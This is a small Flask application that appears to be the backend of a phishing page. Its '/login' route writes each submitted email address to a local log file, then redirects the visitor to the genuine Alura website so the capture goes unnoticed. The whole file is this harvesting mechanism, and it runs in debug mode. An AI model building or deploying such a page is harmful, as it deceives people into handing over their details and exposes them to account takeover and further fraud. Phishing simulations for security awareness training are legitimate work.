from flask import Flask, request, render_template,redirect

app = Flask(__name__)
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def home():
    if request.method == "POST":
        email = request.form.get("email")
        with open("email_log.txt", "a", encoding="utf-8") as f:
            f.write(email + "\n")
    return redirect("https://www.alura.com.br/?srsltid=AfmBOorNVVr76UoSwFfh_X-sIA4FCAfEmAclhXzYwrb7h7TdyuYnGdaK")

if __name__ == "__main__":
    app.run(debug=True)
